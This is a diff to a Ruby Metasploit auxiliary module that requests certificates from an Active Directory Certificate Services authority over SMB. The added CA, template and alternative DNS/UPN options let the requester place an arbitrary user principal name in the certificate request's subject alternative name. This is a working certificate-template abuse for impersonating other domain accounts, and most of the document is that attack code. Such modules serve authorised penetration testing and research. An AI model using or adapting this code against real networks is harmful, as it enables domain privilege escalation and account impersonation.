@@ -10,7 +10,11 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::DCERPC
   include Msf::Auxiliary::Report
 
-  NTDS_CA_SECURITY_EXT = '1.3.6.1.4.1.311.25.2'
+  NTDS_CA_SECURITY_EXT = '1.3.6.1.4.1.311.25.2'.freeze
+  # [2.2.2.7.5 szOID_NT_PRINCIPAL_NAME](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/ea9ef420-4cbf-44bc-b093-c4175139f90f)
+  OID_NT_PRINCIPAL_NAME = '1.3.6.1.4.1.311.20.2.3'.freeze
+  # [[MS-WCCE]: Windows Client Certificate Enrollment Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-winerrata/c39fd72a-da21-4b13-b329-c35d61f74a60)
+  OID_NTDS_OBJECTSID = '1.3.6.1.4.1.311.25.2.1'.freeze
 
   def initialize(info = {})
     super(
@@ -21,7 +25,7 @@ class MetasploitModule < Msf::Auxiliary
         },
         'License' => MSF_LICENSE,
         'Author' => [
-          # todo: Original certipy code
+          # TODO: Original certipy code
           'Spencer McIntyre',
         ],
         'References' => [
@@ -39,20 +43,17 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
+      OptString.new('CA', [ true, 'The target certificate authority.' ]),
+      OptString.new('CERT_TEMPLATE', [ true, 'The certificate template.' ]),
+      OptString.new('ALT_DNS', [ false, 'Alternative certificate DNS.' ]),
+      OptString.new('ALT_UPN', [ false, 'Alternative certificate UPN.' ]),
       Opt::RPORT(445)
     ])
   end
 
   def connect_icpr
     vprint_status('Connecting to ICertPassage (ICPR) Remote Protocol')
-    #icpr = @tree.open_file(filename: 'cert', write: true, read: true)
-    icpr = RubySMB::Dcerpc::Client.new(
-      rhost,
-      RubySMB::Dcerpc::Icpr,
-      username: datastore['SMBUser'],
-      password: datastore['SMBPass']
-    )
-    icpr.connect
+    icpr = @tree.open_file(filename: 'cert', write: true, read: true)
 
     vprint_status('Binding to \\cert...')
     icpr.bind(
@@ -66,31 +67,31 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    # begin
-    #   connect
-    # rescue Rex::ConnectionError => e
-    #   fail_with(Failure::Unreachable, e.message)
-    # end
-    #
-    # begin
-    #   smb_login
-    # rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
-    #   fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
-    # end
-    # report_service(
-    #   host: rhost,
-    #   port: rport,
-    #   host_name: simple.client.default_name,
-    #   proto: 'tcp',
-    #   name: 'smb',
-    #   info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
-    # )
-    #
-    # begin
-    #   @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
-    # rescue RubySMB::Error::RubySMBError => e
-    #   fail_with(Failure::Unreachable, "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
-    # end
+    begin
+      connect
+    rescue Rex::ConnectionError => e
+      fail_with(Failure::Unreachable, e.message)
+    end
+
+    begin
+      smb_login
+    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
+      fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
+    end
+    report_service(
+      host: rhost,
+      port: rport,
+      host_name: simple.client.default_name,
+      proto: 'tcp',
+      name: 'smb',
+      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
+    )
+
+    begin
+      @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
+    rescue RubySMB::Error::RubySMBError => e
+      fail_with(Failure::Unreachable, "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
+    end
 
     begin
       @icpr = connect_icpr
@@ -118,12 +119,27 @@ class MetasploitModule < Msf::Auxiliary
 
   def action_request_cert
     private_key = OpenSSL::PKey::RSA.new(2048)
-    csr = make_csr(cn: 'smcintyre', private_key: private_key)
+    csr = build_csr(
+      cn: datastore['SMBUser'],
+      private_key: private_key,
+      dns: (datastore['ALT_DNS'].blank? ? nil : datastore['ALT_DNS']),
+      msext_upn: (datastore['ALT_UPN'].blank? ? nil : datastore['ALT_UPN'])
+    )
 
+    attributes = { 'CertificateTemplate' => datastore['CERT_TEMPLATE'] }
+    if !datastore['ALT_DNS'].blank? && datastore['ALT_UPN'].blank?
+      attributes['SAN'] = "dns=#{datastore['ALT_DNS']}"
+    elsif !datastore['ALT_DNS'].blank? && !datastore['ALT_UPN'].blank?
+      attributes['SAN'] = "dns=#{datastore['ALT_DNS']}&upn=#{datastore['ALT_UPN']}"
+    elsif datastore['ALT_DNS'].blank? && !datastore['ALT_UPN'].blank?
+      attributes['SAN'] = "upn=#{datastore['ALT_UPN']}"
+    end
+
+    # fail_with(Failure::Unknown, 'till next time my friends')
     print_status('Requesting a certificate...')
     response = @icpr.cert_server_request(
-      attributes: { 'CertificateTemplate' => 'User' },
-      authority: 'msflab-DC-CA',
+      attributes: attributes,
+      authority: datastore['CA'],
       csr: csr
     )
     case response[:status]
@@ -136,11 +152,11 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if (upn = get_cert_upn(response[:certificate]))
+    if (upn = get_cert_msext_upn(response[:certificate]))
       print_status("Certificate UPN: #{upn}")
     end
 
-    if (sid = get_cert_sid(response[:certificate]))
+    if (sid = get_cert_msext_sid(response[:certificate]))
       print_status("Certificate SID: #{sid}")
     end
 
@@ -155,18 +171,38 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Certificate stored at: #{stored_path}")
   end
 
-  def make_csr(cn:, private_key:)
+  # Make a certificate signing request.
+  #
+  # @param [String] cn The common name for the certificate.
+  # @param [OpenSSL::PKey] private_key The private key for the certificate.
+  # @param [String] dns An alternative DNS name to use.
+  # @param [String] msext_upn An alternative User Principal Name (this is a Microsoft-specific feature).
+  def build_csr(cn:, private_key:, dns: nil, msext_upn: nil)
     request = OpenSSL::X509::Request.new
     request.version = 1
     request.subject = OpenSSL::X509::Name.new([
-      ['CN', cn,  OpenSSL::ASN1::UTF8STRING]
+      ['CN', cn, OpenSSL::ASN1::UTF8STRING]
     ])
     request.public_key = private_key.public_key
-    request.sign(private_key, OpenSSL::Digest::SHA256.new)
+
+    subject_alt_names = []
+    subject_alt_names << "DNS:#{dns}" if dns
+    subject_alt_names << "otherName:#{OID_NT_PRINCIPAL_NAME};UTF8:#{msext_upn}" if msext_upn
+    unless subject_alt_names.empty?
+      extension = OpenSSL::X509::ExtensionFactory.new.create_extension('subjectAltName', subject_alt_names.join(','), false)
+      request.add_attribute(OpenSSL::X509::Attribute.new(
+        'extReq',
+        OpenSSL::ASN1::Set.new(
+          [OpenSSL::ASN1::Sequence.new([extension])]
+        )
+      ))
+    end
+
+    request.sign(private_key, OpenSSL::Digest.new('SHA256'))
     request
   end
 
-  def get_cert_sid(cert)
+  def get_cert_msext_sid(cert)
     ext = cert.find_extension(NTDS_CA_SECURITY_EXT)
     return unless ext
 
@@ -174,7 +210,7 @@ class MetasploitModule < Msf::Auxiliary
     ext_asn.value.each do |value|
       value = value.value
       next unless value.is_a?(Array)
-      next unless value[0].value == '1.3.6.1.4.1.311.25.2.1'
+      next unless value[0]&.value == OID_NTDS_OBJECTSID
 
       return value[1].value[0].value
     end
@@ -182,7 +218,7 @@ class MetasploitModule < Msf::Auxiliary
     nil
   end
 
-  def get_cert_upn(cert)
+  def get_cert_msext_upn(cert)
     ext = cert.find_extension('subjectAltName')
     return unless ext
 
@@ -191,7 +227,7 @@ class MetasploitModule < Msf::Auxiliary
     ext_asn.value.each do |value|
       value = value.value
       next unless value.is_a?(Array)
-      next unless value[0].value == 'msUPN'
+      next unless value[0]&.value == 'msUPN'
 
       return value[1].value[0].value
     end
